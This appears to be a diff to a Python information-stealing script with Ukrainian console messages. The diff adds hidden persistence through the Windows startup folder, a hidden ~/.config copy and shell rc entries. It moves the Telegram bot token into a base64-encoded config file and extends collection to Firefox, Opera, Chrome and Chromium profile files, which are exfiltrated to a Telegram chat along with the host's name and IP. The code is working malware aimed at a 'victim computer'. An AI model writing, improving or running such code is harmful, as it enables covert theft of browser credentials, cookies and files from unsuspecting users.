@@ -5,8 +5,9 @@ import socket
 from multiprocessing import Pool,Process,Queue,Lock
 import multiprocessing
 import requests
-import config
+import base64
 import glob
+
 if os.name=='nt':
     try:
         import winshell
@@ -16,6 +17,7 @@ if os.name=='nt':
 PROC_NUM=15
 file_list=[]
 sep='/'
+chtid=wt=0
 def copyFile(src,dst):
     try:
         shutil.copy(src,dst)
@@ -41,7 +43,9 @@ def winntAutoRun():
     Fname=fname.split('\\')[-1]
     startup = winshell.startup()
     newScripFName=startup+'\\'+Fname
+    newcfg=startup+'\\config.py'
     copyFile(fname,newScripFName)
+    copyFile("config.py",newcfg)
     return
 
 
@@ -55,9 +59,9 @@ def addToAutoRun():
         sep='\\'
         newScripFName=home+sep+scrptName
     else:
-        newScripFName=home+sep+scrptName
+        newScripFName=home+sep+".config"+sep+scrptName
     copyFile(scrptName,newScripFName)
-    copyFile("config.py",home+sep+"config.py")
+    copyFile("config.py",home+sep+".config"+sep+"config.py")
     shell=shell[shell[::-1].index(sep)*(-1):]
     if os.name=='nt':
         shell=shell[:shell.index('.')]
@@ -72,11 +76,12 @@ def addToAutoRun():
         autoconf=f"{home}{sep}.{shell}rc"
     autoflg=False
     print(autoconf)
+    sptnm=os.path.split(scrptName)[1]
     if os.path.exists(autoconf):
         with open(autoconf,'r+') as shellrc:
             lines=shellrc.readlines()
             for line in lines:
-                if f"python3 {scrptName}" in line:
+                if f"{sptnm}" in line:
                     autoflg=True
     if autoflg==True:
         print('!!!Файл вже додано для автозапуску!!!')
@@ -84,10 +89,10 @@ def addToAutoRun():
         print('Зараз додаємо файл в автозапуск')
         try:
             with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
-                shellrc.write(f"\npython3 {scrptName} 2>&1 >/dev/null")
+                shellrc.write(f"\npython3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &")
         except FileNotFoundError:
             with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
-                shellrc.write(f"\npython3 {scrptName} 2>&1 >/dev/null")            
+                shellrc.write(f"\npython3 ~/.config/{scrptName[2:]} 2>&1 >/dev/null &")            
     return
 
 def send_document(bot_token,chtid,docfile,caption='Nothing'):
@@ -98,7 +103,7 @@ def send_document(bot_token,chtid,docfile,caption='Nothing'):
 	return
 
 
-def superProc(fileList,num,extlist,hostdir,hostname):
+def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
     cnt=num
     global PROC_NUM
     global sep
@@ -116,14 +121,13 @@ def superProc(fileList,num,extlist,hostdir,hostname):
                 print(f'Proc {num}:',fname)
                 newname=fname[len(fname)-fname[::-1].index(sep)-1:]
                 copyFile(fname,f"{dirname}{sep}{newname}")
-                print(f"copyFile({fname}",f"{dirname}{sep}{newname}")
                 if fileList[cnt]=='TERMINATED':
                     return
                 cnt+=PROC_NUM
             except:
                 pass
             try:
-                send_document(config.WIFI_BOT_TOKEN,config.CHTID,fname,f"Host:{hostname} - {fname}")
+                send_document(wt,cht,fname,f"Host:{hostname} - {fname}")
             except:
                 print('[-]No connection')
 
@@ -132,6 +136,32 @@ def main():
     global PROC_NUM
     global sep
     global file_list
+    global cht
+    global wt
+###########
+
+    chtid=wt=0
+    # pth=os.environ['PWD']
+    cfgpath=f'.{sep}config.py'
+    if not os.path.exists(cfgpath):
+        cfgpath=f'{pth}{sep}.config{sep}config.py'
+	
+    with open(cfgpath,'r') as fl:
+        basestr=fl.read()
+    dstr=base64.b64decode(basestr)
+    mystr=dstr.decode('ascii')
+    keys=mystr.split('\n')
+    cnt=0
+    for el in keys:
+        if '=' in el:
+            ky,vl=el.split('=')
+            if cnt==0:
+                wt=vl[1:-1]
+            else:
+                cht=vl
+            cnt+=1
+############
+
 
     linuxSuperFilesLst=[]
     if os.name!='nt':
@@ -148,8 +178,9 @@ def main():
     operdir=f".{sep}{hostname}-files{sep}opera"
     firefoxdir=f".{sep}{hostname}-files{sep}firefox"
     chromedir=f".{sep}{hostname}-files{sep}chrome"
+    chromiumdir=f".{sep}{hostname}-files{sep}chromium"
     
-    dirlist=[hostdir,operdir,firefoxdir,chromedir]
+    dirlist=[hostdir,operdir,firefoxdir,chromedir,chromiumdir]
     for dir in dirlist:
         if not os.path.exists(dir):
             print(f'!!!Create directory {dir}')#Creating directory for files from victim computer
@@ -161,12 +192,28 @@ def main():
         file_list=manager.list()
         procs=[]
         for num in range(1,PROC_NUM+1):
-            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname} - IPADDR:{ip_address}")))
+            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname} - IPADDR:{ip_address}",wt,cht)))
         for proc in procs:
             proc.start()
 
         if os.name!= 'nt':
             directory_path='/'
+            for file in glob.glob(os.environ['HOME']+"/.mozilla/firefox/*.default-*/*"):
+                file_list.append((file,'firefox'))
+
+            for file in glob.glob(os.environ['HOME']+"/.opera*/*"):
+                file_list.append((file,'opera'))
+
+            for file in glob.glob(os.environ['HOME']+"/.config/chromium/*"):
+                file_list.append((file,'chromium'))
+
+            for file in glob.glob(os.environ['HOME']+"/.config/chrome/*"):
+                file_list.append((file,'chrome'))
+
+            for file in glob.glob(os.environ['HOME']+"/.config/opera/*"):
+                file_list.append((file,'opera'))
+
+
         else:
             for file in glob.glob(os.environ['APPDATA']+"\..\\Local\\Google\\Chrome\\User Data\\Default\\*"):
                 file_list.append((file,'chrome'))
